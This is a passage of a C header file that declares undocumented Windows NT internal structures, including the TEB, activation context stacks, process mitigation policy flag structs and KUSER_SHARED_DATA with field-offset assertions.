    _In_ PACTIVATION_CONTEXT_DATA ActivationContextData,
    _In_opt_ PVOID NotificationContext,
    _In_opt_ PVOID NotificationData,
    _Inout_ PBOOLEAN DisableThisNotification
    );

typedef struct _ACTIVATION_CONTEXT {
    ULONG RefCount;
    ULONG Flags;
    LIST_ENTRY Links;
    ACTIVATION_CONTEXT_DATA* ActivationContextData;
    PACTIVATION_CONTEXT_NOTIFY_ROUTINE NotificationRoutine;
    PVOID NotificationContext;
    ULONG SendNotifications[4];
    ULONG DisabledNotifications[4];
    ASSEMBLY_STORAGE_MAP StorageMap;
    ASSEMBLY_STORAGE_MAP_ENTRY* InlineStorageMapEntries;
    ULONG StackTraceIndex;
    PVOID StackTraces[4][4];
} ACTIVATION_CONTEXT, * PACTIVATION_CONTEXT;

typedef struct _RTL_ACTIVATION_CONTEXT_STACK_FRAME {
    struct _RTL_ACTIVATION_CONTEXT_STACK_FRAME* Previous;
    PACTIVATION_CONTEXT ActivationContext;
    ULONG Flags;
} RTL_ACTIVATION_CONTEXT_STACK_FRAME, * PRTL_ACTIVATION_CONTEXT_STACK_FRAME;

typedef struct _ACTIVATION_CONTEXT_STACK {
    PRTL_ACTIVATION_CONTEXT_STACK_FRAME ActiveFrame;
    LIST_ENTRY FrameListCache;
    ULONG Flags;
    ULONG NextCookieSequenceNumber;
    ULONG StackId;
} ACTIVATION_CONTEXT_STACK, * PACTIVATION_CONTEXT_STACK;

typedef struct _TEB {
    NT_TIB NtTib;

    PVOID EnvironmentPointer;
    CLIENT_ID ClientId;
    PVOID ActiveRpcHandle;
    PVOID ThreadLocalStoragePointer;
    PPEB ProcessEnvironmentBlock;

    ULONG LastErrorValue;
    ULONG CountOfOwnedCriticalSections;
    PVOID CsrClientThread;
    PVOID Win32ThreadInfo;
    ULONG User32Reserved[26];
    ULONG UserReserved[5];
    PVOID WOW32Reserved;
    LCID CurrentLocale;
    ULONG FpSoftwareStatusRegister;
    PVOID ReservedForDebuggerInstrumentation[16];
#ifdef _WIN64
    PVOID SystemReserved1[30];
#else
    PVOID SystemReserved1[26];
#endif

    CHAR PlaceholderCompatibilityMode;
    BOOLEAN PlaceholderHydrationAlwaysExplicit;
    CHAR PlaceholderReserved[10];

    ULONG ProxiedProcessId;
    ACTIVATION_CONTEXT_STACK ActivationStack;

    UCHAR WorkingOnBehalfTicket[8];
    NTSTATUS ExceptionCode;

    PACTIVATION_CONTEXT_STACK ActivationContextStackPointer;
    ULONG_PTR InstrumentationCallbackSp;
    ULONG_PTR InstrumentationCallbackPreviousPc;
    ULONG_PTR InstrumentationCallbackPreviousSp;
#ifdef _WIN64
    ULONG TxFsContext;
#endif

    BOOLEAN InstrumentationCallbackDisabled;
#ifdef _WIN64
    BOOLEAN UnalignedLoadStoreExceptions;
#endif
#ifndef _WIN64
    UCHAR SpareBytes[23];
    ULONG TxFsContext;
#endif
    GDI_TEB_BATCH GdiTebBatch;
    CLIENT_ID RealClientId;
    HANDLE GdiCachedProcessHandle;
    ULONG GdiClientPID;
    ULONG GdiClientTID;
    PVOID GdiThreadLocalInfo;
    ULONG_PTR Win32ClientInfo[62];
    PVOID glDispatchTable[233];
    ULONG_PTR glReserved1[29];
    PVOID glReserved2;
    PVOID glSectionInfo;
    PVOID glSection;
    PVOID glTable;
    PVOID glCurrentRC;
    PVOID glContext;

    NTSTATUS LastStatusValue;
    UNICODE_STRING StaticUnicodeString;
    WCHAR StaticUnicodeBuffer[261];

    PVOID DeallocationStack;
    PVOID TlsSlots[64];
    LIST_ENTRY TlsLinks;

    PVOID Vdm;
    PVOID ReservedForNtRpc;
    PVOID DbgSsReserved[2];

    ULONG HardErrorMode;
#ifdef _WIN64
    PVOID Instrumentation[11];
#else
    PVOID Instrumentation[9];
#endif
    GUID ActivityId;

    PVOID SubProcessTag;
    PVOID PerflibData;
    PVOID EtwTraceData;
    PVOID WinSockData;
    ULONG GdiBatchCount;

    union
    {
        PROCESSOR_NUMBER CurrentIdealProcessor;
        ULONG IdealProcessorValue;
        struct
        {
            UCHAR ReservedPad0;
            UCHAR ReservedPad1;
            UCHAR ReservedPad2;
            UCHAR IdealProcessor;
        };
    };

    ULONG GuaranteedStackBytes;
    PVOID ReservedForPerf;
    PVOID ReservedForOle; // tagSOleTlsData
    ULONG WaitingOnLoaderLock;
    PVOID SavedPriorityState;
    ULONG_PTR ReservedForCodeCoverage;
    PVOID ThreadPoolData;
    PVOID* TlsExpansionSlots;
#ifdef _WIN64
    PVOID DeallocationBStore;
    PVOID BStoreLimit;
#endif
    ULONG MuiGeneration;
    ULONG IsImpersonating;
    PVOID NlsCache;
    PVOID pShimData;
    ULONG HeapData;
    HANDLE CurrentTransactionHandle;
    PTEB_ACTIVE_FRAME ActiveFrame;
    PVOID FlsData;

    PVOID PreferredLanguages;
    PVOID UserPrefLanguages;
    PVOID MergedPrefLanguages;
    ULONG MuiImpersonation;

    union
    {
        USHORT CrossTebFlags;
        USHORT SpareCrossTebBits : 16;
    };
    union
    {
        USHORT SameTebFlags;
        struct
        {
            USHORT SafeThunkCall : 1;
            USHORT InDebugPrint : 1;
            USHORT HasFiberData : 1;
            USHORT SkipThreadAttach : 1;
            USHORT WerInShipAssertCode : 1;
            USHORT RanProcessInit : 1;
            USHORT ClonedThread : 1;
            USHORT SuppressDebugMsg : 1;
            USHORT DisableUserStackWalk : 1;
            USHORT RtlExceptionAttached : 1;
            USHORT InitialThread : 1;
            USHORT SessionAware : 1;
            USHORT LoadOwner : 1;
            USHORT LoaderWorker : 1;
            USHORT SkipLoaderInit : 1;
            USHORT SkipFileAPIBrokering : 1;
        };
    };

    PVOID TxnScopeEnterCallback;
    PVOID TxnScopeExitCallback;
    PVOID TxnScopeContext;
    ULONG LockCount;
    LONG WowTebOffset;
    PVOID ResourceRetValue;
    PVOID ReservedForWdf;
    ULONGLONG ReservedForCrt;
    GUID EffectiveContainerId;
    ULONGLONG LastSleepCounter;
    ULONG SpinCallCount;
    ULONGLONG ExtendedFeatureDisableMask;
} TEB, * PTEB;

typedef struct _PROCESS_DEVICEMAP_INFORMATION {
    union {
        struct {
            HANDLE DirectoryHandle;
        } Set;
        struct {
            ULONG DriveMap;
            UCHAR DriveType[32];
        } Query;
    };
} PROCESS_DEVICEMAP_INFORMATION, *PPROCESS_DEVICEMAP_INFORMATION;

__inline struct _PEB * NtCurrentPeb() { return NtCurrentTeb()->ProcessEnvironmentBlock; }

/*
** PEB/TEB END
*/

/*
**  MITIGATION POLICY START
*/

//redefine enum

#define ProcessDEPPolicy                    0
#define ProcessASLRPolicy                   1
#define ProcessDynamicCodePolicy            2
#define ProcessStrictHandleCheckPolicy      3
#define ProcessSystemCallDisablePolicy      4
#define ProcessMitigationOptionsMask        5
#define ProcessExtensionPointDisablePolicy  6
#define ProcessControlFlowGuardPolicy       7
#define ProcessSignaturePolicy              8
#define ProcessFontDisablePolicy            9
#define ProcessImageLoadPolicy              10
#define ProcessSystemCallFilterPolicy       11
#define ProcessPayloadRestrictionPolicy     12
#define ProcessChildProcessPolicy           13
#define ProcessSideChannelIsolationPolicy   14
#define ProcessUserShadowStackPolicy        15
#define ProcessRedirectionTrustPolicy       16
#define ProcessUserPointerAuthPolicy        17
#define ProcessSEHOPPolicy                  18

typedef struct tagPROCESS_MITIGATION_BINARY_SIGNATURE_POLICY_W10 {
    union {
        DWORD Flags;
        struct {
            DWORD MicrosoftSignedOnly : 1;
            DWORD StoreSignedOnly : 1;
            DWORD MitigationOptIn : 1;
            DWORD AuditMicrosoftSignedOnly : 1;
            DWORD AuditStoreSignedOnly : 1;
            DWORD ReservedFlags : 27;
        } DUMMYSTRUCTNAME;
    } DUMMYUNIONNAME;
} PROCESS_MITIGATION_BINARY_SIGNATURE_POLICY_W10, *PPROCESS_MITIGATION_BINARY_SIGNATURE_POLICY_W10;

typedef struct tagPROCESS_MITIGATION_DYNAMIC_CODE_POLICY_W10 {
    union {
        DWORD Flags;
        struct {
            DWORD ProhibitDynamicCode : 1;
            DWORD AllowThreadOptOut : 1;
            DWORD AllowRemoteDowngrade : 1;
            DWORD AuditProhibitDynamicCode : 1;
            DWORD ReservedFlags : 28;
        } DUMMYSTRUCTNAME;
    } DUMMYUNIONNAME;
} PROCESS_MITIGATION_DYNAMIC_CODE_POLICY_W10, *PPROCESS_MITIGATION_DYNAMIC_CODE_POLICY_W10;

typedef struct tagPROCESS_MITIGATION_CONTROL_FLOW_GUARD_POLICY_W10 {
    union {
        DWORD Flags;
        struct {
            DWORD EnableControlFlowGuard : 1;
            DWORD EnableExportSuppression : 1;
            DWORD StrictMode : 1;
            DWORD EnableXfg : 1;
            DWORD EnableXfgAuditMode : 1;
            DWORD ReservedFlags : 27;
        } DUMMYSTRUCTNAME;
    } DUMMYUNIONNAME;
} PROCESS_MITIGATION_CONTROL_FLOW_GUARD_POLICY_W10, *PPROCESS_MITIGATION_CONTROL_FLOW_GUARD_POLICY_W10;

typedef struct tagPROCESS_MITIGATION_FONT_DISABLE_POLICY_W10 {
    union {
        DWORD Flags;
        struct {
            DWORD DisableNonSystemFonts : 1;
            DWORD AuditNonSystemFontLoading : 1;
            DWORD ReservedFlags : 30;
        } DUMMYSTRUCTNAME;
    } DUMMYUNIONNAME;
} PROCESS_MITIGATION_FONT_DISABLE_POLICY_W10, *PPROCESS_MITIGATION_FONT_DISABLE_POLICY_W10;

typedef struct tagPROCESS_MITIGATION_IMAGE_LOAD_POLICY_W10 {
    union {
        DWORD Flags;
        struct {
            DWORD NoRemoteImages : 1;
            DWORD NoLowMandatoryLabelImages : 1;
            DWORD PreferSystem32Images : 1;
            DWORD AuditNoRemoteImages : 1;
            DWORD AuditNoLowMandatoryLabelImages : 1;
            DWORD ReservedFlags : 27;
        } DUMMYSTRUCTNAME;
    } DUMMYUNIONNAME;
} PROCESS_MITIGATION_IMAGE_LOAD_POLICY_W10, *PPROCESS_MITIGATION_IMAGE_LOAD_POLICY_W10;

typedef struct tagPROCESS_MITIGATION_SYSTEM_CALL_FILTER_POLICY_W10 {
    union {
        ULONG Flags;
        struct {
            ULONG FilterId : 4;
            ULONG ReservedFlags : 28;
        } DUMMYSTRUCTNAME;
    } DUMMYUNIONNAME;
} PROCESS_MITIGATION_SYSTEM_CALL_FILTER_POLICY_W10, *PPROCESS_MITIGATION_SYSTEM_CALL_FILTER_POLICY_W10;

typedef struct tagPROCESS_MITIGATION_PAYLOAD_RESTRICTION_POLICY_W10 {
    union {
        ULONG Flags;
        struct {
            ULONG EnableExportAddressFilter : 1;
            ULONG AuditExportAddressFilter : 1;
            ULONG EnableExportAddressFilterPlus : 1;
            ULONG AuditExportAddressFilterPlus : 1;
            ULONG EnableImportAddressFilter : 1;
            ULONG AuditImportAddressFilter : 1;
            ULONG EnableRopStackPivot : 1;
            ULONG AuditRopStackPivot : 1;
            ULONG EnableRopCallerCheck : 1;
            ULONG AuditRopCallerCheck : 1;
            ULONG EnableRopSimExec : 1;
            ULONG AuditRopSimExec : 1;
            ULONG ReservedFlags : 20;
        } DUMMYSTRUCTNAME;
    } DUMMYUNIONNAME;
} PROCESS_MITIGATION_PAYLOAD_RESTRICTION_POLICY_W10, *PPROCESS_MITIGATION_PAYLOAD_RESTRICTION_POLICY_W10;

typedef struct tagPROCESS_MITIGATION_CHILD_PROCESS_POLICY_W10 {
    union {
        ULONG Flags;
        struct {
            ULONG NoChildProcessCreation : 1;
            ULONG AuditNoChildProcessCreation : 1;
            ULONG AllowSecureProcessCreation : 1;
            ULONG ReservedFlags : 29;
        } DUMMYSTRUCTNAME;
    } DUMMYUNIONNAME;
} PROCESS_MITIGATION_CHILD_PROCESS_POLICY_W10, *PPROCESS_MITIGATION_CHILD_PROCESS_POLICY_W10;

typedef struct tagPROCESS_MITIGATION_SIDE_CHANNEL_ISOLATION_POLICY_W10 {
    union {
        DWORD Flags;
        struct {
            DWORD SmtBranchTargetIsolation : 1;
            DWORD IsolateSecurityDomain : 1;
            DWORD DisablePageCombine : 1;
            DWORD SpeculativeStoreBypassDisable : 1;
            DWORD ReservedFlags : 28;
        } DUMMYSTRUCTNAME;
    } DUMMYUNIONNAME;
} PROCESS_MITIGATION_SIDE_CHANNEL_ISOLATION_POLICY_W10, *PPROCESS_MITIGATION_SIDE_CHANNEL_ISOLATION_POLICY_W10;

typedef struct tagPROCESS_MITIGATION_SYSTEM_CALL_DISABLE_POLICY_W10 {
    union {
        DWORD Flags;
        struct {
            DWORD DisallowWin32kSystemCalls : 1;
            DWORD AuditDisallowWin32kSystemCalls : 1;
            DWORD DisallowFsctlSystemCalls : 1;
            DWORD AuditDisallowFsctlSystemCalls : 1;
            DWORD ReservedFlags : 28;
        } DUMMYSTRUCTNAME;
    } DUMMYUNIONNAME;
} PROCESS_MITIGATION_SYSTEM_CALL_DISABLE_POLICY_W10, *PPROCESS_MITIGATION_SYSTEM_CALL_DISABLE_POLICY_W10;

typedef struct tagPROCESS_MITIGATION_USER_SHADOW_STACK_POLICY_W10 {
    union {
        DWORD Flags;
        struct {
            DWORD EnableUserShadowStack : 1;
            DWORD AuditUserShadowStack : 1;
            DWORD SetContextIpValidation : 1;
            DWORD AuditSetContextIpValidation : 1;
            DWORD EnableUserShadowStackStrictMode : 1;
            DWORD BlockNonCetBinaries : 1;
            DWORD BlockNonCetBinariesNonEhcont : 1;
            DWORD AuditBlockNonCetBinaries : 1;
            DWORD CetDynamicApisOutOfProcOnly : 1;
            DWORD ReservedFlags : 23;
        } DUMMYSTRUCTNAME;
    } DUMMYUNIONNAME;
} PROCESS_MITIGATION_USER_SHADOW_STACK_POLICY_W10, * PPROCESS_MITIGATION_USER_SHADOW_STACK_POLICY_W10;

typedef struct tagPROCESS_MITIGATION_REDIRECTION_TRUST_POLICY_W10 {
    union {
        DWORD Flags;
        struct {
            DWORD EnforceRedirectionTrust : 1;
            DWORD AuditRedirectionTrust : 1;
            DWORD ReservedFlags : 30;
        } DUMMYSTRUCTNAME;
    } DUMMYUNIONNAME;
} PROCESS_MITIGATION_REDIRECTION_TRUST_POLICY_W10, * PPROCESS_MITIGATION_REDIRECTION_TRUST_POLICY_W10;

typedef struct _PROCESS_MITIGATION_USER_POINTER_AUTH_POLICY_W11 {
    union {
        ULONG Flags;
        struct {
            ULONG EnablePointerAuthUserIp : 1;
            ULONG ReservedFlags : 31;
        } DUMMYSTRUCTNAME;
    } DUMMYUNIONNAME;
} PROCESS_MITIGATION_USER_POINTER_AUTH_POLICY_W11, * PPROCESS_MITIGATION_USER_POINTER_AUTH_POLICY_W11;

typedef struct _PROCESS_MITIGATION_SEHOP_POLICY_W11 {
    union {
        ULONG Flags;
        struct {
            ULONG EnableSehop : 1;
            ULONG ReservedFlags : 31;
        } DUMMYSTRUCTNAME;
    } DUMMYUNIONNAME;
} PROCESS_MITIGATION_SEHOP_POLICY_W11, * PPROCESS_MITIGATION_SEHOP_POLICY_W11;

typedef struct _PROCESS_MITIGATION_POLICY_INFORMATION {
    PROCESS_MITIGATION_POLICY Policy;
    union
    {
        PROCESS_MITIGATION_ASLR_POLICY ASLRPolicy;
        PROCESS_MITIGATION_STRICT_HANDLE_CHECK_POLICY StrictHandleCheckPolicy;
        PROCESS_MITIGATION_SYSTEM_CALL_DISABLE_POLICY_W10 SystemCallDisablePolicy;
        PROCESS_MITIGATION_EXTENSION_POINT_DISABLE_POLICY ExtensionPointDisablePolicy;
        PROCESS_MITIGATION_DYNAMIC_CODE_POLICY_W10 DynamicCodePolicy;
        PROCESS_MITIGATION_CONTROL_FLOW_GUARD_POLICY_W10 ControlFlowGuardPolicy;
        PROCESS_MITIGATION_BINARY_SIGNATURE_POLICY_W10 SignaturePolicy;
        PROCESS_MITIGATION_FONT_DISABLE_POLICY_W10 FontDisablePolicy;
        PROCESS_MITIGATION_IMAGE_LOAD_POLICY_W10 ImageLoadPolicy;
        PROCESS_MITIGATION_SYSTEM_CALL_FILTER_POLICY_W10 SystemCallFilterPolicy;
        PROCESS_MITIGATION_PAYLOAD_RESTRICTION_POLICY_W10 PayloadRestrictionPolicy;
        PROCESS_MITIGATION_CHILD_PROCESS_POLICY_W10 ChildProcessPolicy;
        PROCESS_MITIGATION_SIDE_CHANNEL_ISOLATION_POLICY_W10 SideChannelIsolationPolicy;
        PROCESS_MITIGATION_USER_SHADOW_STACK_POLICY_W10 UserShadowStackPolicy;
        PROCESS_MITIGATION_REDIRECTION_TRUST_POLICY_W10 RedirectionTrustPolicy;
        PROCESS_MITIGATION_USER_POINTER_AUTH_POLICY_W11 UserPointerAuthPolicy;
        PROCESS_MITIGATION_SEHOP_POLICY_W11 SEHOPPolicy;
    };
} PROCESS_MITIGATION_POLICY_INFORMATION, *PPROCESS_MITIGATION_POLICY_INFORMATION;

/*
**  MITIGATION POLICY END
*/

/*
** KUSER_SHARED_DATA START
*/
#define NX_SUPPORT_POLICY_ALWAYSOFF     0
#define NX_SUPPORT_POLICY_ALWAYSON      1
#define NX_SUPPORT_POLICY_OPTIN         2
#define NX_SUPPORT_POLICY_OPTOUT        3

#define SEH_VALIDATION_POLICY_ON        0
#define SEH_VALIDATION_POLICY_OFF       1
#define SEH_VALIDATION_POLICY_TELEMETRY 2
#define SEH_VALIDATION_POLICY_DEFER     3

#include <pshpack4.h>
typedef struct _KSYSTEM_TIME {
    ULONG LowPart;
    LONG High1Time;
    LONG High2Time;
} KSYSTEM_TIME, *PKSYSTEM_TIME;
#include <poppack.h>

typedef enum _NT_PRODUCT_TYPE {
    NtProductWinNt = 1,
    NtProductLanManNt,
    NtProductServer
} NT_PRODUCT_TYPE, *PNT_PRODUCT_TYPE;

#define PROCESSOR_FEATURE_MAX 64

typedef enum _ALTERNATIVE_ARCHITECTURE_TYPE {
    StandardDesign,                 // None == 0 == standard design
    NEC98x86,                       // NEC PC98xx series on X86
    EndAlternatives                 // past end of known alternatives
} ALTERNATIVE_ARCHITECTURE_TYPE;

//
// Define Address of User Shared Data
//
#define MM_SHARED_USER_DATA_VA      0x000000007FFE0000

//
// WARNING: this definition is OS version dependent.
// Structure maybe incomplete.
//
#include <pshpack4.h>
typedef struct _KUSER_SHARED_DATA {

    ULONG TickCountLowDeprecated;
    ULONG TickCountMultiplier;

    volatile KSYSTEM_TIME InterruptTime;
    volatile KSYSTEM_TIME SystemTime;
    volatile KSYSTEM_TIME TimeZoneBias;

    USHORT ImageNumberLow;
    USHORT ImageNumberHigh;

    WCHAR NtSystemRoot[260];

    ULONG MaxStackTraceDepth;
    ULONG CryptoExponent;
    ULONG TimeZoneId;
    ULONG LargePageMinimum;

    union {
        ULONG Reserved2[7];
        struct {
            ULONG AitSamplingValue;
            ULONG AppCompatFlag;
            struct {
                ULONG LowPart;
                ULONG HighPart;
            } RNGSeedVersion;
            ULONG GlobalValidationRunlevel;
            LONG TimeZoneBiasStamp;
            ULONG NtBuildNumber;
        };
    };

    NT_PRODUCT_TYPE NtProductType;
    BOOLEAN ProductTypeIsValid;
    UCHAR Reserved0[1];
    USHORT NativeProcessorArchitecture;

    ULONG NtMajorVersion;
    ULONG NtMinorVersion;

    BOOLEAN ProcessorFeatures[PROCESSOR_FEATURE_MAX];
    ULONG Reserved1;
    ULONG Reserved3;
    volatile ULONG TimeSlip;
    ALTERNATIVE_ARCHITECTURE_TYPE AlternativeArchitecture;
    ULONG BootId; //previously AltArchitecturePad
    LARGE_INTEGER SystemExpirationDate;
    ULONG SuiteMask;
    BOOLEAN KdDebuggerEnabled;

    union {
        UCHAR MitigationPolicies;
        struct {
            UCHAR NXSupportPolicy : 2;
            UCHAR SEHValidationPolicy : 2;
            UCHAR CurDirDevicesSkippedForDlls : 2;
            UCHAR Reserved : 2;
        };
    };

    UCHAR Reserved6[2];

    volatile ULONG ActiveConsoleId;
    volatile ULONG DismountCount;
    ULONG ComPlusPackage;
    ULONG LastSystemRITEventTickCount;
    ULONG NumberOfPhysicalPages;
    BOOLEAN SafeBootMode;
    UCHAR VirtualizationFlags;
    UCHAR Reserved12[2];

    union {
        ULONG SharedDataFlags;
        struct {
            ULONG DbgErrorPortPresent : 1;
            ULONG DbgElevationEnabled : 1;
            ULONG DbgVirtEnabled : 1;
            ULONG DbgInstallerDetectEnabled : 1;
            ULONG DbgLkgEnabled : 1;
            ULONG DbgDynProcessorEnabled : 1;
            ULONG DbgConsoleBrokerEnabled : 1;
            ULONG DbgSecureBootEnabled : 1;
            ULONG DbgMultiSessionSku : 1;
            ULONG DbgMultiUsersInSessionSku : 1;
            ULONG DbgStateSeparationEnabled : 1;
            ULONG DbgSplitTokenEnabled : 1;
            ULONG DbgShadowAdminEnabled : 1;
            ULONG SpareBits : 19;
        };
    };
    ULONG DataFlagsPad[1];
    ULONGLONG TestRetInstruction;
    LONGLONG QpcFrequency;

    ULONG SystemCall;
    ULONG SystemCallPad0;

    ULONGLONG SystemCallPad[2];

    union {
        volatile KSYSTEM_TIME TickCount;
        volatile ULONG64 TickCountQuad;
        struct {
            ULONG ReservedTickCountOverlay[3];
            ULONG TickCountPad[1];
        };
    };

    ULONG Cookie;
    ULONG CookiedPad[1];

    LONGLONG ConsoleSessionForegroundProcessId;

    ULONGLONG TimeUpdateLock;
    ULONGLONG BaselineSystemTimeQpc;
    ULONGLONG BaselineInterruptTimeQpc;
    ULONGLONG QpcSystemTimeIncrement;
    ULONGLONG QpcInterruptTimeIncrement;
    UCHAR QpcSystemTimeIncrementShift;
    UCHAR QpcInterruptTimeIncrementShift;
    USHORT UnparkedProcessorCount;

    ULONG EnclaveFeatureMask[4];
    union {
        ULONG Reserved8;
        ULONG TelemetryCoverageRound;
    };

    USHORT UserModeGlobalLogger[16];

    ULONG ImageFileExecutionOptions;
    ULONG LangGenerationCount;
    ULONGLONG Reserved4;

    volatile ULONG64 InterruptTimeBias;
    volatile ULONG64 QpcBias;

    ULONG ActiveProcessorCount;
    volatile UCHAR ActiveGroupCount;
    UCHAR Reserved9;

    union {
        USHORT QpcData;
        struct {
            UCHAR QpcBypassEnabled : 1;
            UCHAR QpcShift : 1;
        };
    };

    LARGE_INTEGER TimeZoneBiasEffectiveStart;
    LARGE_INTEGER TimeZoneBiasEffectiveEnd;

    XSTATE_CONFIGURATION XState;

    KSYSTEM_TIME FeatureConfigurationChangeStamp;
    ULONG Spare;

    ULONG64 UserPointerAuthMask;

    ULONG InternsReserved[210];

} KUSER_SHARED_DATA, *PKUSER_SHARED_DATA;
#include <poppack.h>

#define USER_SHARED_DATA ((KUSER_SHARED_DATA * const)MM_SHARED_USER_DATA_VA)

#if !defined(__midl) && !defined(MIDL_PASS)

//
// The overall size can change, but it must be the same for all architectures.
//

C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, TickCountLowDeprecated) == 0x0);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, TickCountMultiplier) == 0x4);
C_ASSERT(__alignof(KSYSTEM_TIME) == 4);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, InterruptTime) == 0x08);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, SystemTime) == 0x014);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, TimeZoneBias) == 0x020);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, ImageNumberLow) == 0x02c);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, ImageNumberHigh) == 0x02e);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, NtSystemRoot) == 0x030);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, MaxStackTraceDepth) == 0x238);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, CryptoExponent) == 0x23c);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, TimeZoneId) == 0x240);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, LargePageMinimum) == 0x244);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, AitSamplingValue) == 0x248);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, AppCompatFlag) == 0x24c);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, RNGSeedVersion) == 0x250);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, GlobalValidationRunlevel) == 0x258);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, TimeZoneBiasStamp) == 0x25c);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, NtBuildNumber) == 0x260);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, NtProductType) == 0x264);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, ProductTypeIsValid) == 0x268);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, NativeProcessorArchitecture) == 0x26a);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, NtMajorVersion) == 0x26c);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, NtMinorVersion) == 0x270);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, ProcessorFeatures) == 0x274);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, Reserved1) == 0x2b4);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, Reserved3) == 0x2b8);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, TimeSlip) == 0x2bc);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, AlternativeArchitecture) == 0x2c0);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, SystemExpirationDate) == 0x2c8);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, SuiteMask) == 0x2d0);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, KdDebuggerEnabled) == 0x2d4);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, MitigationPolicies) == 0x2d5);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, ActiveConsoleId) == 0x2d8);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, DismountCount) == 0x2dc);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, ComPlusPackage) == 0x2e0);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, LastSystemRITEventTickCount) == 0x2e4);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, NumberOfPhysicalPages) == 0x2e8);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, SafeBootMode) == 0x2ec);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, VirtualizationFlags) == 0x2ed);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, Reserved12) == 0x2ee);

#if defined(_MSC_EXTENSIONS)

C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, SharedDataFlags) == 0x2f0);

#endif

C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, TestRetInstruction) == 0x2f8);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, QpcFrequency) == 0x300);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, SystemCall) == 0x308);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, SystemCallPad0) == 0x30c);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, SystemCallPad) == 0x310);

#if defined(_MSC_EXTENSIONS)

C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, TickCount) == 0x320);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, TickCountQuad) == 0x320);

#endif

C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, Cookie) == 0x330);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, ConsoleSessionForegroundProcessId) == 0x338);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, TimeUpdateLock) == 0x340);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, BaselineSystemTimeQpc) == 0x348);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, BaselineInterruptTimeQpc) == 0x350);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, QpcSystemTimeIncrement) == 0x358);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, QpcInterruptTimeIncrement) == 0x360);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, QpcSystemTimeIncrementShift) == 0x368);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, QpcInterruptTimeIncrementShift) == 0x369);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, UnparkedProcessorCount) == 0x36a);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, EnclaveFeatureMask) == 0x36c);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, Reserved8) == 0x37c);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, UserModeGlobalLogger) == 0x380);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, ImageFileExecutionOptions) == 0x3a0);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, LangGenerationCount) == 0x3a4);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, Reserved4) == 0x3a8);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, InterruptTimeBias) == 0x3b0);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, QpcBias) == 0x3b8);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, ActiveProcessorCount) == 0x3c0);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, ActiveGroupCount) == 0x3c4);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, Reserved9) == 0x3c5);
C_ASSERT(FIELD_OFFSET(KUSER_SHARED_DATA, QpcData) == 0x3c6);
